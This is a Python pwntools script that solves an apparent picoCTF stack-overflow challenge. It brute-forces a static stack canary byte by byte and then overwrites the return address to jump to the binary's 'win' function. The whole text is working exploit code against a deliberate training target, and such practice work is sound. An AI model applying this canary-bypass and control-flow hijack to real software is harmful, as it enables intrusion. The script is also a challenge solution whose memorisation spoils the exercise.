#!/usr/bin/env python3

import string
from pwn import *
from string import printable

local = True # False for the remote flag
context.binary = './vuln'


def get_process():
    if local:
        elf = ELF('./vuln')
        return elf.process()
    else:
        return remote('saturn.picoctf.net', 53885)


def find_canary():
    canary = b""
    for offset in range(1,5):
        for i in printable:
            p = get_process()
            junk = b'A'*64 + canary + i.encode("utf8")
            payload = [
                junk,
            ]
            payload = b''.join(payload)


            # print( p.recvuntil(b'?').decode(encoding='ascii') )
            # print(str(64 + len(canary) + 1))
            p.sendline(str(64 + len(canary) + 1))
            # print( p.recvuntil(b'Input>').decode(encoding='ascii') )
            p.sendline(payload)
            # print(payload)
            result = p.recvall().decode(encoding='ascii')
            # print(result)
            if "Ok... Now Where's the Flag?" in result:
                canary += i.encode("utf8")
                break
    return canary


def run(canary):
    for i in [1,]:
        elf = ELF('./vuln')
        p = get_process()

        junk = b'A'*64 + canary + b"A" * 16
        flag = elf.symbols['win']
        payload = [
            junk,
            p32(flag)
        ]

        payload = b''.join(payload)

        print( p.recvuntil(b'?').decode(encoding='ascii') )
        p.sendline(b"92")
        print( p.recvuntil(b'>').decode(encoding='ascii') )
        print(payload)
        p.sendline(payload)
        sleep(1)
        result = p.recvall().decode(encoding='ascii')
        print(result)

if __name__ == "__main__":
    print(run(find_canary()))
